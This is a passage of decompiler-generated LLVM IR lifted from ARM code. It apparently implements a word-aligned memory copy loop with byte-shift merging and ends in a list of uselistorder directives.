dec_label_pc_1abb8:                               ; preds = %dec_label_pc_1abb8.loopexit, %dec_label_pc_1ab94
  %v2_1aafc63 = phi i32 [ %v5_1abac, %dec_label_pc_1abb8.loopexit ], [ %v1_1ab88, %dec_label_pc_1ab94 ]
  %v0_1aaec59 = phi i32 [ %v2_1abb0, %dec_label_pc_1abb8.loopexit ], [ %v2_1ab98, %dec_label_pc_1ab94 ]
  %v0_1abb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1abb8 = add i32 %v0_1abb8, 3
  store i32 %v1_1abb8, i32* %r1.global-to-local, align 4
  br label %bb143

dec_label_pc_1abc0:                               ; preds = %dec_label_pc_1ab50
  br i1 %v5_1ac30, label %dec_label_pc_1ac0c, label %dec_label_pc_1abc8

dec_label_pc_1abc8:                               ; preds = %dec_label_pc_1abc0
  store i32 %v2_1ac2c, i32* %r2.global-to-local, align 4
  %v3_1abcc = load i32, i32* @r4, align 4
  store i32 %v3_1abcc, i32* %stack_var_-12, align 4
  %v6_1abcc = load i32, i32* @r5, align 4
  %v8_1abcc = inttoptr i32 %v6_1abcc to i8*
  store i8* %v8_1abcc, i8** %stack_var_-8, align 4
  %v11_1abcc = load i32, i32* @lr, align 4
  br label %dec_label_pc_1abd0

dec_label_pc_1abd0:                               ; preds = %dec_label_pc_1abd0.dec_label_pc_1abd0_crit_edge, %dec_label_pc_1abc8
  %v0_1abf4 = phi i32 [ %v1_1abf4, %dec_label_pc_1abd0.dec_label_pc_1abd0_crit_edge ], [ %v0_1ab8831, %dec_label_pc_1abc8 ]
  %v0_1abd4 = phi i32 [ %v0_1abd4.pre, %dec_label_pc_1abd0.dec_label_pc_1abd0_crit_edge ], [ %v1_1ab40, %dec_label_pc_1abc8 ]
  %v0_1abd0 = phi i32 [ %v0_1abd0.pre, %dec_label_pc_1abd0.dec_label_pc_1abd0_crit_edge ], [ %v2_1ab44, %dec_label_pc_1abc8 ]
  %v3_1abd0 = udiv i32 %v0_1abd0, 65536
  store i32 %v3_1abd0, i32* %lr.global-to-local, align 4
  %v1_1abd4 = add i32 %v0_1abd4, -4
  %v2_1abd4 = inttoptr i32 %v1_1abd4 to i32*
  %v3_1abd4 = load i32, i32* %v2_1abd4, align 4
  store i32 %v3_1abd4, i32* @r3, align 4
  %v4_1abd4 = add i32 %v0_1abd4, -8
  %v5_1abd4 = inttoptr i32 %v4_1abd4 to i32*
  %v6_1abd4 = load i32, i32* %v5_1abd4, align 4
  store i32 %v6_1abd4, i32* %r4.global-to-local, align 4
  %v7_1abd4 = add i32 %v0_1abd4, -12
  %v8_1abd4 = inttoptr i32 %v7_1abd4 to i32*
  %v9_1abd4 = load i32, i32* %v8_1abd4, align 4
  store i32 %v9_1abd4, i32* %r5.global-to-local, align 4
  %v10_1abd4 = add i32 %v0_1abd4, -16
  %v11_1abd4 = inttoptr i32 %v10_1abd4 to i32*
  %v12_1abd4 = load i32, i32* %v11_1abd4, align 4
  store i32 %v10_1abd4, i32* %r1.global-to-local, align 4
  %v4_1abd8 = mul i32 %v12_1abd4, 65536
  %v5_1abd8 = or i32 %v4_1abd8, %v3_1abd0
  store i32 %v5_1abd8, i32* %lr.global-to-local, align 4
  %v3_1abdc = udiv i32 %v12_1abd4, 65536
  %v4_1abe0 = mul i32 %v9_1abd4, 65536
  %v5_1abe0 = or i32 %v3_1abdc, %v4_1abe0
  store i32 %v5_1abe0, i32* @ip, align 4
  %v3_1abe4 = udiv i32 %v9_1abd4, 65536
  %v4_1abe8 = mul i32 %v6_1abd4, 65536
  %v5_1abe8 = or i32 %v3_1abe4, %v4_1abe8
  store i32 %v5_1abe8, i32* %r5.global-to-local, align 4
  %v3_1abec = udiv i32 %v6_1abd4, 65536
  %v4_1abf0 = mul i32 %v3_1abd4, 65536
  %v5_1abf0 = or i32 %v3_1abec, %v4_1abf0
  store i32 %v5_1abf0, i32* %r4.global-to-local, align 4
  %v1_1abf4 = add i32 %v0_1abf4, -16
  %v2_1abf4 = inttoptr i32 %v1_1abf4 to i32*
  store i32 %v5_1abf0, i32* %v2_1abf4, align 4
  %v4_1abf4 = add i32 %v0_1abf4, -12
  %v5_1abf4 = inttoptr i32 %v4_1abf4 to i32*
  %v6_1abf4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1abf4, i32* %v5_1abf4, align 4
  %v7_1abf4 = add i32 %v0_1abf4, -8
  %v8_1abf4 = inttoptr i32 %v7_1abf4 to i32*
  %v9_1abf4 = load i32, i32* @ip, align 4
  store i32 %v9_1abf4, i32* %v8_1abf4, align 4
  %v10_1abf4 = add i32 %v0_1abf4, -4
  %v11_1abf4 = inttoptr i32 %v10_1abf4 to i32*
  %v12_1abf4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1abf4, i32* %v11_1abf4, align 4
  store i32 %v1_1abf4, i32* %r0.global-to-local, align 4
  %v0_1abf8 = load i32, i32* %r2.global-to-local, align 4
  %v2_1abf8 = add i32 %v0_1abf8, -16
  store i32 %v2_1abf8, i32* %r2.global-to-local, align 4
  %v6_1abfc = icmp slt i32 %v0_1abf8, 16
  br i1 %v6_1abfc, label %dec_label_pc_1ac00, label %dec_label_pc_1abd0.dec_label_pc_1abd0_crit_edge

dec_label_pc_1abd0.dec_label_pc_1abd0_crit_edge:  ; preds = %dec_label_pc_1abd0
  %v0_1abd0.pre = load i32, i32* @r3, align 4
  %v0_1abd4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1abd0

dec_label_pc_1ac00:                               ; preds = %dec_label_pc_1abd0
  %v2_1ac00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ac00, i32* @r4, align 4
  %v5_1ac00 = load i8*, i8** %stack_var_-8, align 4
  %v6_1ac00 = ptrtoint i8* %v5_1ac00 to i32
  store i32 %v6_1ac00, i32* @r5, align 4
  store i32 %v11_1abcc, i32* @lr, align 4
  %v2_1ac04 = add i32 %v0_1abf8, -4
  store i32 %v2_1ac04, i32* %r2.global-to-local, align 4
  %v4_1ac04 = add i32 %v0_1abf8, 2147483632
  %v5_1ac04 = and i32 %v2_1ac04, %v4_1ac04
  %v6_1ac04 = icmp slt i32 %v5_1ac04, 0
  store i1 %v6_1ac04, i1* %cpsr_v.global-to-local, align 1
  %v7_1ac04 = icmp slt i32 %v2_1ac04, 0
  store i1 %v7_1ac04, i1* %cpsr_n.global-to-local, align 1
  %v5_1ac08 = icmp slt i32 %v2_1abf8, -12
  br i1 %v5_1ac08, label %dec_label_pc_1ac24, label %dec_label_pc_1ac0c

dec_label_pc_1ac0c:                               ; preds = %dec_label_pc_1ac00, %dec_label_pc_1abc0, %dec_label_pc_1ac0c
  %v1_1ac18 = phi i32 [ %v5_1ac18, %dec_label_pc_1ac0c ], [ %v1_1abf4, %dec_label_pc_1ac00 ], [ %v0_1ab8831, %dec_label_pc_1abc0 ]
  %v0_1ac0c = load i32, i32* @r3, align 4
  %v3_1ac0c = udiv i32 %v0_1ac0c, 65536
  store i32 %v3_1ac0c, i32* %ip.global-to-local, align 4
  %v0_1ac10 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ac10 = add i32 %v0_1ac10, -4
  %v2_1ac10 = inttoptr i32 %v1_1ac10 to i32*
  %v3_1ac10 = load i32, i32* %v2_1ac10, align 4
  store i32 %v3_1ac10, i32* @r3, align 4
  store i32 %v1_1ac10, i32* %r1.global-to-local, align 4
  %v4_1ac14 = mul i32 %v3_1ac10, 65536
  %v5_1ac14 = or i32 %v4_1ac14, %v3_1ac0c
  store i32 %v5_1ac14, i32* @ip, align 4
  %v2_1ac18 = add i32 %v1_1ac18, -4
  %v3_1ac18 = inttoptr i32 %v2_1ac18 to i32*
  store i32 %v5_1ac14, i32* %v3_1ac18, align 4
  %v4_1ac18 = load i32, i32* %r0.global-to-local, align 4
  %v5_1ac18 = add i32 %v4_1ac18, -4
  store i32 %v5_1ac18, i32* %r0.global-to-local, align 4
  %v0_1ac1c = load i32, i32* %r2.global-to-local, align 4
  %v2_1ac1c = add i32 %v0_1ac1c, -4
  store i32 %v2_1ac1c, i32* %r2.global-to-local, align 4
  %v6_1ac20 = icmp slt i32 %v0_1ac1c, 4
  br i1 %v6_1ac20, label %dec_label_pc_1ac24.loopexit, label %dec_label_pc_1ac0c

dec_label_pc_1ac24.loopexit:                      ; preds = %dec_label_pc_1ac0c
  %v4_1ac1c = sub i32 3, %v0_1ac1c
  %v5_1ac1c = and i32 %v4_1ac1c, %v0_1ac1c
  %v6_1ac1c = icmp slt i32 %v5_1ac1c, 0
  %v7_1ac1c = icmp slt i32 %v2_1ac1c, 0
  store i1 %v6_1ac1c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1ac1c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1ac24

dec_label_pc_1ac24:                               ; preds = %dec_label_pc_1ac24.loopexit, %dec_label_pc_1ac00
  %v2_1aafc64 = phi i32 [ %v5_1ac18, %dec_label_pc_1ac24.loopexit ], [ %v1_1abf4, %dec_label_pc_1ac00 ]
  %v0_1aaec60 = phi i32 [ %v2_1ac1c, %dec_label_pc_1ac24.loopexit ], [ %v2_1ac04, %dec_label_pc_1ac00 ]
  %v0_1ac24 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ac24 = add i32 %v0_1ac24, 2
  store i32 %v1_1ac24, i32* %r1.global-to-local, align 4
  br label %bb143

dec_label_pc_1ac2c:                               ; preds = %dec_label_pc_1ab40
  br i1 %v5_1ac30, label %dec_label_pc_1ac78, label %dec_label_pc_1ac34

dec_label_pc_1ac34:                               ; preds = %dec_label_pc_1ac2c
  store i32 %v2_1ac2c, i32* %r2.global-to-local, align 4
  %v3_1ac38 = load i32, i32* @r4, align 4
  store i32 %v3_1ac38, i32* %stack_var_-12, align 4
  %v6_1ac38 = load i32, i32* @r5, align 4
  %v8_1ac38 = inttoptr i32 %v6_1ac38 to i8*
  store i8* %v8_1ac38, i8** %stack_var_-8, align 4
  %v11_1ac38 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1ac3c

dec_label_pc_1ac3c:                               ; preds = %dec_label_pc_1ac3c.dec_label_pc_1ac3c_crit_edge, %dec_label_pc_1ac34
  %v0_1ac60 = phi i32 [ %v1_1ac60, %dec_label_pc_1ac3c.dec_label_pc_1ac3c_crit_edge ], [ %v0_1ab8831, %dec_label_pc_1ac34 ]
  %v0_1ac40 = phi i32 [ %v0_1ac40.pre, %dec_label_pc_1ac3c.dec_label_pc_1ac3c_crit_edge ], [ %v1_1ab40, %dec_label_pc_1ac34 ]
  %v0_1ac3c = phi i32 [ %v0_1ac3c.pre, %dec_label_pc_1ac3c.dec_label_pc_1ac3c_crit_edge ], [ %v2_1ab44, %dec_label_pc_1ac34 ]
  %v3_1ac3c = udiv i32 %v0_1ac3c, 16777216
  store i32 %v3_1ac3c, i32* %lr.global-to-local, align 4
  %v1_1ac40 = add i32 %v0_1ac40, -4
  %v2_1ac40 = inttoptr i32 %v1_1ac40 to i32*
  %v3_1ac40 = load i32, i32* %v2_1ac40, align 4
  store i32 %v3_1ac40, i32* @r3, align 4
  %v4_1ac40 = add i32 %v0_1ac40, -8
  %v5_1ac40 = inttoptr i32 %v4_1ac40 to i32*
  %v6_1ac40 = load i32, i32* %v5_1ac40, align 4
  store i32 %v6_1ac40, i32* %r4.global-to-local, align 4
  %v7_1ac40 = add i32 %v0_1ac40, -12
  %v8_1ac40 = inttoptr i32 %v7_1ac40 to i32*
  %v9_1ac40 = load i32, i32* %v8_1ac40, align 4
  store i32 %v9_1ac40, i32* %r5.global-to-local, align 4
  %v10_1ac40 = add i32 %v0_1ac40, -16
  %v11_1ac40 = inttoptr i32 %v10_1ac40 to i32*
  %v12_1ac40 = load i32, i32* %v11_1ac40, align 4
  store i32 %v10_1ac40, i32* %r1.global-to-local, align 4
  %v4_1ac44 = mul i32 %v12_1ac40, 256
  %v5_1ac44 = or i32 %v4_1ac44, %v3_1ac3c
  store i32 %v5_1ac44, i32* %lr.global-to-local, align 4
  %v3_1ac48 = udiv i32 %v12_1ac40, 16777216
  %v4_1ac4c = mul i32 %v9_1ac40, 256
  %v5_1ac4c = or i32 %v3_1ac48, %v4_1ac4c
  store i32 %v5_1ac4c, i32* @ip, align 4
  %v3_1ac50 = udiv i32 %v9_1ac40, 16777216
  %v4_1ac54 = mul i32 %v6_1ac40, 256
  %v5_1ac54 = or i32 %v3_1ac50, %v4_1ac54
  store i32 %v5_1ac54, i32* %r5.global-to-local, align 4
  %v3_1ac58 = udiv i32 %v6_1ac40, 16777216
  %v4_1ac5c = mul i32 %v3_1ac40, 256
  %v5_1ac5c = or i32 %v3_1ac58, %v4_1ac5c
  store i32 %v5_1ac5c, i32* %r4.global-to-local, align 4
  %v1_1ac60 = add i32 %v0_1ac60, -16
  %v2_1ac60 = inttoptr i32 %v1_1ac60 to i32*
  store i32 %v5_1ac5c, i32* %v2_1ac60, align 4
  %v4_1ac60 = add i32 %v0_1ac60, -12
  %v5_1ac60 = inttoptr i32 %v4_1ac60 to i32*
  %v6_1ac60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1ac60, i32* %v5_1ac60, align 4
  %v7_1ac60 = add i32 %v0_1ac60, -8
  %v8_1ac60 = inttoptr i32 %v7_1ac60 to i32*
  %v9_1ac60 = load i32, i32* @ip, align 4
  store i32 %v9_1ac60, i32* %v8_1ac60, align 4
  %v10_1ac60 = add i32 %v0_1ac60, -4
  %v11_1ac60 = inttoptr i32 %v10_1ac60 to i32*
  %v12_1ac60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1ac60, i32* %v11_1ac60, align 4
  store i32 %v1_1ac60, i32* %r0.global-to-local, align 4
  %v0_1ac64 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ac64 = add i32 %v0_1ac64, -16
  store i32 %v2_1ac64, i32* %r2.global-to-local, align 4
  %v6_1ac68 = icmp slt i32 %v0_1ac64, 16
  br i1 %v6_1ac68, label %dec_label_pc_1ac6c, label %dec_label_pc_1ac3c.dec_label_pc_1ac3c_crit_edge

dec_label_pc_1ac3c.dec_label_pc_1ac3c_crit_edge:  ; preds = %dec_label_pc_1ac3c
  %v0_1ac3c.pre = load i32, i32* @r3, align 4
  %v0_1ac40.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ac3c

dec_label_pc_1ac6c:                               ; preds = %dec_label_pc_1ac3c
  %v2_1ac6c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1ac6c, i32* @r4, align 4
  %v5_1ac6c = load i8*, i8** %stack_var_-8, align 4
  %v6_1ac6c = ptrtoint i8* %v5_1ac6c to i32
  store i32 %v6_1ac6c, i32* @r5, align 4
  store i32 %v11_1ac38, i32* @lr, align 4
  %v2_1ac70 = add i32 %v0_1ac64, -4
  store i32 %v2_1ac70, i32* %r2.global-to-local, align 4
  %v4_1ac70 = add i32 %v0_1ac64, 2147483632
  %v5_1ac70 = and i32 %v2_1ac70, %v4_1ac70
  %v6_1ac70 = icmp slt i32 %v5_1ac70, 0
  store i1 %v6_1ac70, i1* %cpsr_v.global-to-local, align 1
  %v7_1ac70 = icmp slt i32 %v2_1ac70, 0
  store i1 %v7_1ac70, i1* %cpsr_n.global-to-local, align 1
  %v5_1ac74 = icmp slt i32 %v2_1ac64, -12
  br i1 %v5_1ac74, label %dec_label_pc_1ac90, label %dec_label_pc_1ac78

dec_label_pc_1ac78:                               ; preds = %dec_label_pc_1ac6c, %dec_label_pc_1ac2c, %dec_label_pc_1ac78
  %v1_1ac84 = phi i32 [ %v5_1ac84, %dec_label_pc_1ac78 ], [ %v1_1ac60, %dec_label_pc_1ac6c ], [ %v0_1ab8831, %dec_label_pc_1ac2c ]
  %v0_1ac78 = load i32, i32* @r3, align 4
  %v3_1ac78 = udiv i32 %v0_1ac78, 16777216
  store i32 %v3_1ac78, i32* %ip.global-to-local, align 4
  %v0_1ac7c = load i32, i32* %r1.global-to-local, align 4
  %v1_1ac7c = add i32 %v0_1ac7c, -4
  %v2_1ac7c = inttoptr i32 %v1_1ac7c to i32*
  %v3_1ac7c = load i32, i32* %v2_1ac7c, align 4
  store i32 %v3_1ac7c, i32* @r3, align 4
  store i32 %v1_1ac7c, i32* %r1.global-to-local, align 4
  %v4_1ac80 = mul i32 %v3_1ac7c, 256
  %v5_1ac80 = or i32 %v4_1ac80, %v3_1ac78
  store i32 %v5_1ac80, i32* @ip, align 4
  %v2_1ac84 = add i32 %v1_1ac84, -4
  %v3_1ac84 = inttoptr i32 %v2_1ac84 to i32*
  store i32 %v5_1ac80, i32* %v3_1ac84, align 4
  %v4_1ac84 = load i32, i32* %r0.global-to-local, align 4
  %v5_1ac84 = add i32 %v4_1ac84, -4
  store i32 %v5_1ac84, i32* %r0.global-to-local, align 4
  %v0_1ac88 = load i32, i32* %r2.global-to-local, align 4
  %v2_1ac88 = add i32 %v0_1ac88, -4
  store i32 %v2_1ac88, i32* %r2.global-to-local, align 4
  %v6_1ac8c = icmp slt i32 %v0_1ac88, 4
  br i1 %v6_1ac8c, label %dec_label_pc_1ac90.loopexit, label %dec_label_pc_1ac78

dec_label_pc_1ac90.loopexit:                      ; preds = %dec_label_pc_1ac78
  %v4_1ac88 = sub i32 3, %v0_1ac88
  %v5_1ac88 = and i32 %v4_1ac88, %v0_1ac88
  %v6_1ac88 = icmp slt i32 %v5_1ac88, 0
  %v7_1ac88 = icmp slt i32 %v2_1ac88, 0
  store i1 %v6_1ac88, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1ac88, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1ac90

dec_label_pc_1ac90:                               ; preds = %dec_label_pc_1ac90.loopexit, %dec_label_pc_1ac6c
  %v2_1aafc65 = phi i32 [ %v5_1ac84, %dec_label_pc_1ac90.loopexit ], [ %v1_1ac60, %dec_label_pc_1ac6c ]
  %v0_1aaec61 = phi i32 [ %v2_1ac88, %dec_label_pc_1ac90.loopexit ], [ %v2_1ac70, %dec_label_pc_1ac6c ]
  %v0_1ac90 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ac90 = add i32 %v0_1ac90, 1
  store i32 %v1_1ac90, i32* %r1.global-to-local, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_1ac84, { 0, 2, 1 }
  uselistorder i32 %v3_1ac78, { 1, 0 }
  uselistorder i32 %v2_1ac70, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1ac60, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v12_1ac40, { 1, 0 }
  uselistorder i32 %v10_1ac40, { 1, 0 }
  uselistorder i32 %v9_1ac40, { 1, 0, 2 }
  uselistorder i32 %v6_1ac40, { 1, 0, 2 }
  uselistorder i32 %v3_1ac3c, { 1, 0 }
  uselistorder i32 %v0_1ac40, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1ac60, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1ac18, { 0, 2, 1 }
  uselistorder i32 %v3_1ac0c, { 1, 0 }
  uselistorder i32 %v2_1ac04, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1abf4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v12_1abd4, { 1, 0 }
  uselistorder i32 %v10_1abd4, { 1, 0 }
  uselistorder i32 %v9_1abd4, { 1, 0, 2 }
  uselistorder i32 %v6_1abd4, { 1, 0, 2 }
  uselistorder i32 %v3_1abd0, { 1, 0 }
  uselistorder i32 %v0_1abd4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1abf4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1abac, { 0, 2, 1 }
  uselistorder i32 %v3_1aba0, { 1, 0 }
  uselistorder i32 %v2_1ab98, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1ab88, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v12_1ab68, { 1, 0 }
  uselistorder i32 %v10_1ab68, { 1, 0 }
  uselistorder i32 %v9_1ab68, { 1, 0, 2 }
  uselistorder i32 %v6_1ab68, { 1, 0, 2 }
  uselistorder i32 %v3_1ab64, { 1, 0 }
  uselistorder i32 %v0_1ab68, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1ab88, { 3, 2, 1, 0 }
  uselistorder i1 %v5_1ac30, { 2, 0, 1 }
  uselistorder i32 %v0_1ab48, { 1, 0 }
  uselistorder i32 %v0_1ac34, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1ab8831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1ab38, { 2, 1, 0 }
  uselistorder i32 %v0_1ab38, { 2, 0, 1 }
  uselistorder i32 %v2_1ab30, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_1ab30, { 1, 0, 2 }
  uselistorder i32 %v0_1ab30, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1ab8832, { 2, 1, 0 }
  uselistorder i32 %v11_1ab0c, { 1, 0 }
  uselistorder i32 %v7_1ab0c, { 1, 0 }
  uselistorder i32 %v1_1aaec, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1aaec, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1aaf0, { 1, 0 }
  uselistorder i32 %v7_1aae4, { 0, 2, 1 }
  uselistorder i32 %v10_1aae0, { 1, 0 }
  uselistorder i32 %v9_1aad8, { 1, 0, 2 }
  uselistorder i32 %v6_1aad4, { 1, 0 }
  uselistorder i32 %v2_1aacc, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1aacc, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1aadc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1aac0, { 0, 2, 1 }
  uselistorder i32 %v13_1aabc, { 1, 0 }
  uselistorder i32 %v4_1aab8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1aab8, { 2, 0, 1 }
  uselistorder i32 %v6_1aac0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1aab0, { 0, 2, 1 }
  uselistorder i32 %v16_1aaac, { 1, 0 }
  uselistorder i32 %v4_1aaa8, { 1, 0 }
  uselistorder i32 %v0_1aab8.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_1aab0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1aa9c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_1aa98, { 1, 0 }
  uselistorder i32 %v1_1aa94, { 1, 0 }
  uselistorder i32 %v10_1aa90, { 1, 0 }
  uselistorder i32 %v0_1aa90, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1aa94, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_1aa88, { 0, 2, 1 }
  uselistorder i32 %v2_1aa7c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1aa7c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1aa9449, { 1, 2, 0 }
  uselistorder i32 %v1_1aa74, { 2, 1, 0 }
  uselistorder i32 %v1_1aa6c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1aa64, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_1aa60, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1aa5c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1aa5c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_1aa48, { 0, 2, 1 }
  uselistorder i32 %v3_1aa3c, { 1, 0 }
  uselistorder i32 %v2_1aa34, { 0, 2, 1, 3 }
  uselistorder i32 %v12_1aa24, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1aa04, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1aa24, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1a9dc, { 0, 2, 1 }
  uselistorder i32 %v3_1a9d0, { 1, 0 }
  uselistorder i32 %v2_1a9c8, { 0, 2, 1, 3 }
  uselistorder i32 %v12_1a9b8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1a998, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a9b8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1a970, { 0, 2, 1 }
  uselistorder i32 %v3_1a964, { 1, 0 }
  uselistorder i32 %v2_1a95c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_1a94c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1a92c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a94c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_1a9f4, { 2, 0, 1 }
  uselistorder i32 %v0_1a9f8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1a94c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1a8fc, { 1, 0 }
  uselistorder i32 %v0_1a8fc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1a8f4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_1a8f4, { 1, 0, 2 }
  uselistorder i32 %v0_1a8f4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a94c76, { 2, 1, 0 }
  uselistorder i32 %v1_1a8d4, { 1, 0, 2 }
  uselistorder i32 %v1_1a8ac, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1a8ac, { 1, 2, 0, 3 }
  uselistorder i32 %v8_1a898, { 1, 0, 2 }
  uselistorder i32 %v6_1a894, { 1, 0 }
  uselistorder i32 %v2_1a88c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1a88c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1a89c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_1a884, { 0, 2, 1 }
  uselistorder i1 %v0_1a884, { 1, 0 }
  uselistorder i1 %v1_1a884, { 1, 0 }
  uselistorder i32 %v3_1a880, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1a878, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1a864, { 1, 0 }
  uselistorder i32 %v12_1a858, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1a84c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a850, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_1a840, { 0, 2, 1 }
  uselistorder i32 %v2_1a838, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1a838, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_1a830, { 1, 0 }
  uselistorder i32 %v1_1a828, { 2, 1, 0 }
  uselistorder i32 %v2_1a820, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_1a820, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1a810, { 1, 0 }
  uselistorder i32 %v1_1a810, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_1a810, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 25, 26, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 0, 24, 1, 2, 3, 4, 5, 25, 6, 7, 63, 64, 65, 66, 67, 69, 68, 8, 9, 26, 10, 12, 11, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 27, 28, 58, 29, 30, 31, 32, 33, 59, 34, 35, 36, 37, 38, 60, 39, 40, 41, 42, 43, 61, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 11, 4, 6, 8, 81, 7, 80, 79, 82, 87, 84, 85, 83, 9, 10, 12, 17, 13, 14, 15, 16, 18, 19, 21, 20, 22, 23, 86, 24, 25, 32, 26, 33, 27, 34, 28, 29, 30, 31, 35, 37, 39, 36, 51, 38, 40, 42, 44, 41, 52, 43, 45, 47, 49, 46, 53, 48, 50, 54, 55, 60, 56, 57, 58, 59, 61, 62, 64, 63, 65, 66, 72, 67, 68, 73, 69, 74, 70, 75, 71, 76, 77, 78, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 23, 4, 5, 24, 6, 57, 59, 60, 7, 8, 9, 10, 11, 25, 12, 14, 13, 15, 16, 58, 17, 18, 26, 19, 20, 21, 22, 27, 28, 37, 29, 30, 38, 31, 32, 39, 33, 34, 35, 36, 40, 41, 0, 42, 43, 45, 44, 46, 47, 53, 48, 49, 50, 54, 51, 52, 55, 56, 1, 2 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 16, 17, 18, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 6, 4, 8, 5, 41, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 19, 20, 21, 42, 22, 0, 24, 1, 25, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
